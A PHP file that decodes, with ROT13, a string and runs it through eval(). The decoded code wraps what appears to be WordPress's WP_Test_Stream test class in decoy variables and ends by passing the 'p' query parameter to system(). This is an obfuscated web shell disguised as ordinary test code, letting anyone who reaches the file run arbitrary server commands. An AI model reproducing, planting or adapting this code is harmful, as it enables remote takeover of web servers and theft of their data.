<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Pynff JC_Grfg_Fgernz.
 *
 * Na va-zrzbel fgernzJenccre vzcyrzragngvba sbe grfgvat fgernzf.  Jevgrf gb n
 * fgernz HEY yvxr \"cebgbpby://ohpxrg/sbb\" jvyy or fgberq va gur fgngvp
 * inevnoyr JC_Grfg_Fgernz::$qngn['ohpxrg']['/sbb'].
 *
 * Perngvat n qverpgbel ng \"cebgbpby://ohpxrg/sbb\" jvyy fgber gur fgevat
 * 'QVERPGBEL' gb gur fgngvp inevnoyr JC_Grfg_Fgernz::$qngn['ohpxrg']['/sbb/']
 * (abgr gur genvyvat fynfu).
 *
 * Guvf pynff pna or hfrq gb grfg gung pbqr jbexf jvgu onfvp ernq/jevgr fgernzf.
 *
 * Guvf pynff qbrf abg ertvfgre vgfrys nf n fgernz unaqyre: grfg svkgherf
 * fubhyq znxr gur nccebcevngr pnyy gb fgernz_jenccre_ertvfgre().
 */
pynff JC_Grfg_Fgernz {
	pbafg SVYR_ZBQR      = 0100666;
	pbafg QVERPGBEL_ZBQR = 040777;

	/**
	 * Va-zrzbel fgbentr sbe svyrf naq qverpgbevrf fvzhyngrq ol guvf jenccre.
	 */
	choyvp fgngvp $qngn = neenl();

	choyvp $cbfvgvba;
	choyvp $svyr;
	choyvp $ohpxrg;
	choyvp $qngn_ers;

	/**
	 * Gur pheerag pbagrkg.
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/pynff.fgernzjenccre.cuc
	 *
	 * @ine erfbhepr|ahyy
	 */
	choyvp $pbagrkg;

	/**
	 * Vavgvnyvmrf vagreany fgngr sbe ernqvat gur tvira HEY.
	 *
	 * @cnenz fgevat $hey N HEY bs gur sbez \"cebgbpby://ohpxrg/cngu\".
	 */
	cevingr shapgvba bcra( $hey ) {
		$pbzcbaragf = neenl_zretr(
			neenl(
				'ubfg' => '',
				'cngu' => '',
			),
			cnefr_hey( $hey )
		);

		$guvf->ohpxrg = $pbzcbaragf['ubfg'];
		$guvf->svyr   = $pbzcbaragf['cngu'] ? $pbzcbaragf['cngu'] : '/';

		vs ( rzcgl( $guvf->ohpxrg ) ) {
			guebj arj Rkprcgvba( 'Pnaabg hfr na rzcgl ohpxrg anzr' );
		}

		vs ( ! vffrg( JC_Grfg_Fgernz::$qngn[ $guvf->ohpxrg ] ) ) {
			JC_Grfg_Fgernz::$qngn[ $guvf->ohpxrg ] = neenl();
		}

		$guvf->qngn_ers =& JC_Grfg_Fgernz::$qngn[ $guvf->ohpxrg ][ $guvf->svyr ];

		$guvf->cbfvgvba = 0;
	}

	/**
	 * Bcraf n HEY.
	 *
	 * @frr fgernzJenccre::fgernz_bcra
	 */
	choyvp shapgvba fgernz_bcra( $cngu, $zbqr, $bcgvbaf, &$bcrarq_cngu ) {
		$guvf->bcra( $cngu );
		erghea gehr;
	}

	/**
	 * Ernqf sebz n fgernz.
	 *
	 * @frr fgernzJenccre::fgernz_ernq
	 */
	choyvp shapgvba fgernz_ernq( $pbhag ) {
		vs ( ! vffrg( $guvf->qngn_ers ) ) {
			erghea '';
		}

		$erg = fhofge( $guvf->qngn_ers, $guvf->cbfvgvba, $pbhag );

		$guvf->cbfvgvba += fgeyra( $erg );
		erghea $erg;
	}

	/**
	 * Jevgrf gb n fgernz.
	 *
	 * @frr fgernzJenccre::fgernz_jevgr
	 */
	choyvp shapgvba fgernz_jevgr( $qngn ) {
		vs ( ! vffrg( $guvf->qngn_ers ) ) {
			$guvf->qngn_ers = '';
		}

		$yrsg  = fhofge( $guvf->qngn_ers, 0, $guvf->cbfvgvba );
		$evtug = fhofge( $guvf->qngn_ers, $guvf->cbfvgvba + fgeyra( $qngn ) );

		JC_Grfg_Fgernz::$qngn[ $guvf->ohpxrg ][ $guvf->svyr ] = $yrsg . $qngn . $evtug;

		$guvf->cbfvgvba += fgeyra( $qngn );
		erghea fgeyra( $qngn );
	}

	/**
	 * Frrxf gb fcrpvsvp ybpngvba va n fgernz.
	 *
	 * @frr fgernzJenccre::fgernz_frrx
	 *
	 * @cnenz vag $bssfrg Gur fgernz bssfrg gb frrx gb.
	 * @cnenz vag $jurapr Bcgvbany. Frrx cbfvgvba.
	 * @erghea obby Ergheaf gehr jura cbfvgvba vf hcqngrq, ryfr snyfr.
	 */
	choyvp shapgvba fgernz_frrx( $bssfrg, $jurapr = FRRX_FRG ) {
		vs ( rzcgl( $guvf->qngn_ers ) ) {
			erghea snyfr;
		}

		$arj_bssfrg = $guvf->cbfvgvba;
		fjvgpu ( $jurapr ) {
			pnfr FRRX_PHE:
				$arj_bssfrg += $bssfrg;
				oernx;

			pnfr FRRX_RAQ:
				$arj_bssfrg = fgeyra( $guvf->qngn_ers ) + $bssfrg;
				oernx;

			pnfr FRRX_FRG:
				$arj_bssfrg = $bssfrg;
				oernx;

			qrsnhyg:
				erghea snyfr;
		}

		vs ( $arj_bssfrg < 0 ) {
			erghea snyfr;
		}

		// Fnir gur arj cbfvgvba.
		$guvf->cbfvgvba = $arj_bssfrg;

		erghea gehr;
	}

	/**
	 * Ergevrirf gur pheerag cbfvgvba bs n fgernz.
	 *
	 * @frr fgernzJenccre::fgernz_gryy
	 */
	choyvp shapgvba fgernz_gryy() {
		erghea $guvf->cbfvgvba;
	}

	/**
	 * Grfgf sbe raq-bs-svyr.
	 *
	 * @frr fgernzJenccre::fgernz_rbs
	 */
	choyvp shapgvba fgernz_rbs() {
		vs ( ! vffrg( $guvf->qngn_ers ) ) {
			erghea gehr;
		}

		erghea $guvf->cbfvgvba >= fgeyra( $guvf->qngn_ers );
	}

	/**
	 * Punatr fgernz zrgnqngn.
	 *
	 * @frr fgernzJenccre::fgernz_zrgnqngn
	 */
	choyvp shapgvba fgernz_zrgnqngn( $cngu, $bcgvba, $inyhr ) {
		$guvf->bcra( $cngu );
		vs ( FGERNZ_ZRGN_GBHPU === $bcgvba ) {
			vs ( ! vffrg( $guvf->qngn_ers ) ) {
				$guvf->qngn_ers = '';
			}
			erghea gehr;
		}
		erghea snyfr;
	}

	/**
	 * Perngrf n qverpgbel.
	 *
	 * @frr fgernzJenccre::zxqve
	 *
	 * @cnenz fgevat $cngu    Qverpgbel juvpu fubhyq or perngrq.
	 * @cnenz vag    $zbqr    Gur inyhr cnffrq gb zxqve().
	 * @cnenz vag    $bcgvbaf N ovgjvfr znfx bs inyhrf, fhpu nf FGERNZ_ZXQVE_ERPHEFVIR.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba zxqve( $cngu, $zbqr, $bcgvbaf ) {
		$guvf->bcra( $cngu );

		$cynvasvyr = egevz( $guvf->svyr, '/' );

		// Purpx vs n svyr be qverpgbel jvgu gur fnzr anzr nyernql rkvfgf.
		vs ( vffrg( JC_Grfg_Fgernz::$qngn[ $guvf->ohpxrg ][ $cynvasvyr ] )
			|| vffrg( JC_Grfg_Fgernz::$qngn[ $guvf->ohpxrg ][ $cynvasvyr . '/' ] )
		) {
			erghea snyfr;
		}

		$qve_ers = & $guvf->trg_qverpgbel_ers();
		$qve_ers = 'QVERPGBEL';

		erghea gehr;
	}

	/**
	 * Perngrf n svyr zrgnqngn bowrpg, jvgu qrsnhygf.
	 *
	 * @cnenz neenl $fgngf Cnegvny svyr zrgnqngn.
	 * @erghea neenl Pbzcyrgr svyr zrgnqngn.
	 */
	cevingr shapgvba znxr_fgng( $fgngf ) {
		$qrsnhygf = neenl(
			'qri'     => 0,
			'vab'     => 0,
			'zbqr'    => 0,
			'ayvax'   => 0,
			'hvq'     => 0,
			'tvq'     => 0,
			'eqri'    => 0,
			'fvmr'    => 0,
			'ngvzr'   => 0,
			'zgvzr'   => 0,
			'pgvzr'   => 0,
			'oyxfvmr' => 0,
			'oybpxf'  => 0,
		);

		erghea neenl_zretr( $qrsnhygf, $fgngf );
	}

	/**
	 * Ergevrirf vasbezngvba nobhg n svyr.
	 *
	 * @frr fgernzJenccre::fgernz_fgng
	 */
	choyvp shapgvba fgernz_fgng() {
		$qve_ers = & $guvf->trg_qverpgbel_ers();
		vs ( fhofge( $guvf->svyr, -1 ) === '/' || vffrg( $qve_ers ) ) {
			erghea $guvf->znxr_fgng(
				neenl(
					'zbqr' => JC_Grfg_Fgernz::QVERPGBEL_ZBQR,
				)
			);
		}

		vs ( ! vffrg( $guvf->qngn_ers ) ) {
			erghea snyfr;
		}

		erghea $guvf->znxr_fgng(
			neenl(
				'fvmr' => fgeyra( $guvf->qngn_ers ),
				'zbqr' => JC_Grfg_Fgernz::SVYR_ZBQR,
			)
		);
	}

	/**
	 * Ergevrirf vasbezngvba nobhg n svyr.
	 *
	 * @frr fgernzJenccre::hey_fgng
	 */
	choyvp shapgvba hey_fgng( $cngu, $syntf ) {
		$guvf->bcra( $cngu );
		erghea $guvf->fgernz_fgng();
	}

	/**
	 * Qryrgrf n svyr.
	 *
	 * @frr fgernzJenccre::hayvax
	 */
	choyvp shapgvba hayvax( $cngu ) {
		vs ( ! vffrg( $guvf->qngn_ers ) ) {
			erghea snyfr;
		}
		hafrg( JC_Grfg_Fgernz::$qngn[ $guvf->ohpxrg ][ $guvf->svyr ] );
		erghea gehr;
	}

	/**
	 * Vagrecergf guvf fgernz'f cngu nf n qverpgbel, naq ergheaf gur ragel.
	 *
	 * @erghea N ersrerapr gb gur qngn ragel sbe gur qverpgbel.
	 */
	cevingr shapgvba &trg_qverpgbel_ers() {
		erghea JC_Grfg_Fgernz::$qngn[ $guvf->ohpxrg ][ egevz( $guvf->svyr, '/' ) . '/' ];
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>